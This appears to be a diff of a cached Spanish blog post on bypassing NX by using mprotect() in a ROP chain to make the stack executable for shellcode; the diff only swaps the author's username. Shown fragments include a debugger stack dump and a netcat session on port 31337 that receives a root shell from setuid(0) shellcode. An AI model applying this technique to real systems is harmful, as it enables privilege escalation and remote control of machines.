@@ -1,4 +1,4 @@
-I"�E<p class="lead">En ocasiones se nos presenta la situacion donde tenemos el NX activado y tenemos que recurrir a tecnicas como <code class="language-plaintext highlighter-rouge">ret2libc</code>, <code class="language-plaintext highlighter-rouge">ret2reg</code>, mas que nada tecnicas que usen <code class="language-plaintext highlighter-rouge">ROP</code>. Asi que ahora te voy a mostrar como usar <code class="language-plaintext highlighter-rouge">mprotect()</code> para volver a marcar el stack como ejecutable y puedas inyectar una shellcode.</p>
+I"�E<p class="lead">En ocasiones se nos presenta la situacion donde tenemos el NX activado y tenemos que recurrir a tecnicas como <code class="language-plaintext highlighter-rouge">ret2libc</code>, <code class="language-plaintext highlighter-rouge">ret2reg</code>, mas que nada tecnicas que usen <code class="language-plaintext highlighter-rouge">ROP</code>. Asi que ahora te voy a mostrar como usar <code class="language-plaintext highlighter-rouge">mprotect()</code> para volver a marcar el stack como ejecutable y puedas inyectar una shellcode.</p>
 
 <h2 id="mprotect">mprotect()</h2>
 
@@ -94,7 +94,7 @@ gef➤
 0x007fffffffe428│+0x0010: "kaaaaaablaaaaaabmaaa"
 0x007fffffffe430│+0x0018: "laaaaaabmaaa"
 0x007fffffffe438│+0x0020: 0x007f006161616d ("maaa"?)
-0x007fffffffe440│+0x0028: 0x007fffffffe528  →  0x007fffffffe89f  →  "/home/c4rta/Downloads/mprotect"
+0x007fffffffe440│+0x0028: 0x007fffffffe528  →  0x007fffffffe89f  →  "/home/GuxFiz/Downloads/mprotect"
 0x007fffffffe448│+0x0030: 0xc91dfa2faf99b844
 0x007fffffffe450│+0x0038: 0x0000000000000000
 ────────────────────────────────────────────
@@ -185,7 +185,7 @@ $1 = {&lt;text variable, no debug info&gt;} 0x7ffff7eb62f0 &lt;mprotect&gt;
 </code></pre></div></div>
 <p><strong>Ojo:</strong> Antes de ejecutarlo hay que ponernos en escucha por el puerto 31337, ya que la shellcode ejecuta un <code class="language-plaintext highlighter-rouge">setuid(0)</code> y establece una conexion con nosotros mismos por ese puerto</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>󰣇  c4rta ~/Downloads  nc 192.168.1.76 31337 -v
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>󰣇  GuxFiz ~/Downloads  nc 192.168.1.76 31337 -v
 Connection to 192.168.1.76 31337 port [tcp/*] succeeded!
 whoami
 root
